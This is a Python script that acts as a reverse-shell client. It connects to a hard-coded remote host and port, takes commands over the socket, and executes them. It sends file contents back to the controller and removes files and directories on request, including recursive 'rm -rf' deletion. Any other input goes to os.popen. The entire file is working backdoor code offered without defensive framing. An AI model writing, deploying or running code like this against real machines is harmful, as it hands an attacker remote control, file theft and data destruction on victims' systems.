import socket
import subprocess
import re
import os
from sys import platform
from shutil import rmtree
import colorama

colorama.init(autoreset=True)

s = socket.socket()
HOST = "192.168.1.30"
PORT = 5051
SERVER = (HOST, PORT)
FORMAT = "utf-8"
BUFFER = 8192
DC_MSG = "!dc"
s.connect(SERVER)

def getPWD():
    pwd = f'{colorama.Back.BLACK}{colorama.Fore.YELLOW}{os.getcwd()}{colorama.Back.RESET}{colorama.Fore.RESET}'
    return pwd

cmdList = {}
if platform == "linux" or platform == "linux2":
    cmdList["listCommand"] = "ls"
    cmdList["pwdCommand"] = "pwd"
    cmdList["cdCommand"] = "cd"
    cmdList["fileContentCommand"] = "cat"
elif platform == "win32":
    cmdList["listCommand"] = "dir"
    cmdList["pwdCommand"] = "pwd"
    cmdList["cdCommand"] = "cd"
    cmdList["fileContentCommand"] = "type"

run = True
while run:
    cmd = s.recv(BUFFER).decode(FORMAT)
    try:
        if cmd == DC_MSG:
            run = False
            s.close()
        elif re.search("^ls\s?", cmd):
            lsItems = ""
            lsDir = cmd.replace("ls", "")
            lsDir = lsDir.replace(" ", "")
            if len(lsDir) > 1:
                ls = os.listdir(lsDir)
            else:
                ls = os.listdir()

            if len(lsDir) > 2 and not re.search("/$", lsDir):
                lsDir += "/"

            for item in ls:
                if os.path.isdir(lsDir + item) and not re.search("^\.", item):
                    item = colorama.Back.YELLOW + colorama.Fore.BLACK + item + colorama.Back.RESET + colorama.Fore.RESET
                if re.search("^\.", item):
                    lsItems += f"{colorama.Back.MAGENTA}{item}{colorama.Back.RESET}  "
                else:
                    lsItems += item + "  "
            lsItems += "\n"
            s.send(lsItems.encode(FORMAT))
        elif re.search("^cd ", cmd):
            newCmd = cmd.replace("cd ", "")
            os.chdir(newCmd)
            crrDir = f"Current dir: {getPWD()}\n"
            s.send(crrDir.encode(FORMAT))
        elif re.search("^pwd$", cmd):
            pwd = getPWD() + "\n"
            s.send(pwd.encode(FORMAT))
        elif re.search("^rm -rf ", cmd):
            toRemove = cmd.replace("rm -rf ", "")
            rmtree(toRemove)
            s.send(f"{colorama.Fore.GREEN}Dir: {toRemove} was deleted".encode(FORMAT))
        elif re.search("^rm ", cmd):
            toRemove = cmd.replace("rm ", "")
            os.remove(toRemove)
            s.send(f"{colorama.Fore.GREEN}File: {toRemove} was deleted".encode(FORMAT))
        elif re.search("cat ", cmd):
            catFile = cmd.replace("cat ", "")
            try:
                fileCtn = open(catFile, "r")
                lines = fileCtn.readlines()
                ctn = ""
                for line in lines:
                    ctn += line
                s.send(ctn.encode(FORMAT))
            except:
                s.send(f"{colorama.Fore.RED}File doesnt't exist".encode(FORMAT))
        
        ### TODO -- test this function on other computer ###
        elif re.search("^echo ", cmd):
            os.popen(cmd)
            s.send(f"Exec {cmd}".encode(FORMAT))
        else:
            os.popen(cmd)
            s.send(f"Get command: {cmd}".encode(FORMAT))
    except:
        s.send(f"Error from command: {colorama.Fore.RED}{cmd}{colorama.Fore.RESET}".encode(FORMAT))
